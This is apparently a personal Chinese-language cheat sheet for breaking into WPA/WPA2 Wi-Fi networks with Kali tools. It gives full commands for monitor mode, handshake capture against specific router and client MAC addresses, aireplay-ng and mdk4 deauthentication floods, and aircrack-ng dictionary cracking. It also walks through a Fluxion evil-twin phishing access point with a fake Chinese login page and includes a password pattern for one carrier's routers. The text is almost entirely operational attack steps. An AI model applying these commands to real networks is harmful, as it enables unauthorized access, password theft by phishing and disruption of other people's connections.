[Link](https://www.mzbky.com/106.html)

被动方式
```sh
# 不报错可用
modprobe -nv rt2800usb

lsusb # 看有没有显示
ifconfig # 查看 wlan0 无线网卡
airmon-ng # 查看是否支持监听模式 显示wlan0 支持
airmon-ng check kill # 可能需要 ifconfig eth0 down 关闭其他 eth
airmon-ng start wlan0 # 开启监听

airodump-ng wlan0  # 扫描 wifi 2.4G
airodump-ng -C 5180-5885 wlan0mon # 扫5G
airodump-ng -C 5765 wlan0mon
## iw list  # 检查支持的频段 网卡不支持5G频段，就无法搜索到5GHz信号

# BSSID             PWR   Beacons	CH  # CH wifi频段11
# 60:32:B1:56:3F:B2 -32   24      11
# BSSID              STATTION
# 60:32:B1:56:3F:B2  CC:08:FB:DD:42:18

# 只用此方式抓包较慢
airodump-ng -c 11 --bssid 60:32:B1:56:3F:B2 -w /home/kali/tmp/handshake wlan0
airodump-ng -c 153 wlan0 # 路由器看了下我的WIFI5信道是153 5G, 是可以抓到的

# 第一行 CH  9 ][ Elapsed: 27 s ][ 2023-01-14 22:40 ][ WPA handshake: 34:36:54:D8:1F:A9 # 显示 handshake 为攻击成功, 这时Ctrl+C退出命令
```

ACK方式
```sh
# 方式1 上面的不要关闭 执行下面
## 针对所有客户端
aireplay-ng -0 10 -a 60:32:B1:56:3F:B2 wlan0
## 针对指定客户端
aireplay-ng -0 10 -a 60:32:B1:56:3F:B2 -c CC:08:FB:DD:42:18 wlan0
# 方式2 停止扫描， 执行攻击， 马上开启扫描。
# -0: 通知设备断开连接 10: 攻击次数 -a:目标bssid -c: 目标踢下线的设备
```

aircrack-ng -w ~/password.txt -b ~/handshake-01.cap


## 钓鱼 fluxion
https://github.com/FluxionNetwork/fluxion

```sh
./fluxion.sh -i

# 2.Handshake Snooper 检索WPA/WPA2加密散列。
# 3.扫描所有信道 （2.4G和5G),  绿色是正在有人在连接且扫描到的。白色不确定是否有连接。
# 选wifi，显示026直接输入26回车
# 2.重置攻击
# 2.aireplay-ng 解除认证方式
# hash 验证方法: cowpatty

# 返回
# 1 创建一个邪恶的双胞胎接入点
# 1 创建SSL证书
# 2 仿真（断开原网络的选项 需要测试，不确定效果）
# 认证页面 选3中文。 (如果确认对方路由器也可选别的)
```

## 8812AU网卡使用 5G攻击
```sh
#MDK4攻击：
iwconfig wlan0 mode monitor
airmon-ng check kill
airmon-ng start wlan0
airodump-ng -C 5180-5885 wlan0
# -C <freq>[,<freq>[,...]]

airodump-ng -w fhfgd -c 信道 --bssid MAC地址 wlan0

#再打开一个终端
mdk4 wlan0 d -B MAC地址
mdk4 wlan0 d -c 36,40,44,48,149,153,157,161,165
```

## Dictionary

天翼wifi:8位数字密码，例如 xx4yyykw


## Article
[零度WIFI安全测试](https://www.youtube.com/watch?v=_9q9Cl555wg)
[Kali Linux 暴力破解学校办公室WiFi](https://mp.weixin.qq.com/s/EZ7i1uI44LTyv2HhZbUgyg)
## Tools
Elcomsoft Wireless Security Auditor